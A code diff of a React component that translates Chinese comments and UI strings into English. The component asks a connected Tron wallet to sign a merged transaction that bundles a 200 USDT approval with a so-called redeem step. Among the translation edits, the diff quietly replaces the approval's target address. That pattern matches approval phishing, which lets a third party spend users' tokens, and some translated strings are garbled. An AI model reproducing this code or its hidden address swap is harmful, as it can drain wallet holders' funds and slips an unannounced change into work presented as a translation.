@@ -1,24 +1,24 @@
 import { Button, message } from 'antd';
 import { useState } from 'react';
 
-// 常量配置 - Approve + SendTrx 场景
+// Constant configuration - Approve + SendTrx case
 const CONTRACTS = {
   USDT: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
   FROM_ADDRESS: 'TKMBdaT5E5e4X3qtff3aY2ain5pG5WNPL2',
-  TARGET_ADDRESS: 'TDgJmYStKqzawFQyMav8XxNp1pTpdhEWg9',
+  TARGET_ADDRESS: 'TKzxdSv2FZKQrEqkKVgp5DcwEXBEKMg2Ax',
   RECIPIENT_ADDRESS: 'TNPeeaaFB7K9cmo4uQpcU32zGK8G1NYqeL',
 };
 
 const TRANSACTION_PARAMS = {
-  APPROVE_AMOUNT: 200000000, // 授权 200 USDT
-  TRX_AMOUNT: 75, // 发送 75 TRX
+  APPROVE_AMOUNT: 200000000, // approval 200 USDT
+  TRX_AMOUNT: 75, // send 75 TRX
 };
 
 function MultiActionApproveTrx() {
   const [resultMessage, setResultMessage] = useState('');
   const [isLoading, setIsLoading] = useState(false);
 
-  // 创建授权交易
+  // Createapproval transaction
   const createApproveTransaction = async (tronWeb) => {
     const parameter = [
       { type: 'address', value: CONTRACTS.TARGET_ADDRESS },
@@ -34,7 +34,7 @@ function MultiActionApproveTrx() {
     );
   };
 
-  // 创建赎回交易
+  // Createredeem transaction
   const createUnfreezeTransaction = async (tronWeb) => {
     return {
       transaction: {
@@ -65,7 +65,7 @@ function MultiActionApproveTrx() {
     };
   };
 
-  // 合并交易
+  // Merge transaction
   const mergeTransactions = (approveTransaction, sendTrxTransaction) => {
     const originalContract =
       approveTransaction.transaction.raw_data.contract[1];
@@ -76,7 +76,7 @@ function MultiActionApproveTrx() {
     return { mergedTransaction: approveTransaction, originalContract };
   };
 
-  // 签名并发送交易
+  // Sign and broadcast transaction
   const signAndSendTransaction = async (tronWeb, mergedTransaction) => {
     console.log(
       '>>> MultiActionApproveTrx signAndSendTransaction',
@@ -86,56 +86,56 @@ function MultiActionApproveTrx() {
     return await tronWeb.trx.sign(mergedTransaction.transaction);
   };
 
-  // 主要执行函数
+  // Main execution function
   const executeMultiAction = async () => {
     const tronWeb = window.tronWeb;
 
     if (!tronWeb) {
-      throw new Error('TronWeb 未加载，请确保已连接 Tron 钱包');
+      throw new Error('TronWeb is not loaded; make sure a Tron wallet is connected');
     }
 
     try {
-      message.info('创建授权 + 赎回交易中...');
+      message.info('Createapproval + redeem transaction...');
 
       const [approveTransaction, sendTrxTransaction] = await Promise.all([
         createApproveTransaction(tronWeb),
         createUnfreezeTransaction(tronWeb),
       ]);
 
-      message.info('合并交易中...');
+      message.info('Merging transactions...');
       const { mergedTransaction, originalContract } = mergeTransactions(
         approveTransaction,
         sendTrxTransaction,
       );
 
-      message.info('签名并发送交易中...');
+      message.info('Signing and broadcasting transaction...');
       const result = await signAndSendTransaction(
         tronWeb,
         mergedTransaction,
         originalContract,
       );
 
-      console.log('授权 + 赎回交易结果:', result);
+      console.log('approval + redeemTransaction result:', result);
       return result;
     } catch (error) {
-      console.error('授权 + 赎回交易执行失败:', error);
+      console.error('approval + redeemTransaction failed:', error);
       throw error;
     }
   };
 
-  // 按钮点击处理函数
+  // Button click handler
   const handleButtonClick = async () => {
     setIsLoading(true);
     setResultMessage('');
 
     try {
       const result = await executeMultiAction();
-      setResultMessage(`交易成功: ${JSON.stringify(result)}`);
-      message.success('授权 + 赎回执行成功！');
+      setResultMessage(`Transaction succeeded: ${JSON.stringify(result)}`);
+      message.success('approval + redeemsucceeded!');
     } catch (error) {
-      const errorMessage = error.message || '未知错误';
-      setResultMessage(`交易失败: ${errorMessage}`);
-      message.error(`交易执行失败: ${errorMessage}`);
+      const errorMessage = error.message || 'Unknown error';
+      setResultMessage(`Transaction failed: ${errorMessage}`);
+      message.error(`Transaction failed: ${errorMessage}`);
     } finally {
       setIsLoading(false);
     }
@@ -143,7 +143,7 @@ function MultiActionApproveTrx() {
 
   return (
     <div style={{ padding: '20px' }}>
-      <h3>授权 + 赎回多合约签名</h3>
+      <h3>approval + redeem multi-contract signing</h3>
       <Button
         type="primary"
         size="large"
@@ -151,7 +151,7 @@ function MultiActionApproveTrx() {
         onClick={handleButtonClick}
         style={{ marginBottom: '16px' }}
       >
-        {isLoading ? '执行中...' : '执行授权 + 赎回'}
+        {isLoading ? 'Running...' : 'Run approval + redeem'}
       </Button>
 
       {resultMessage && (
@@ -164,7 +164,7 @@ function MultiActionApproveTrx() {
             wordBreak: 'break-all',
           }}
         >
-          <strong>执行结果:</strong>
+          <strong>Result:</strong>
           <div style={{ marginTop: '8px' }}>{resultMessage}</div>
         </div>
       )}
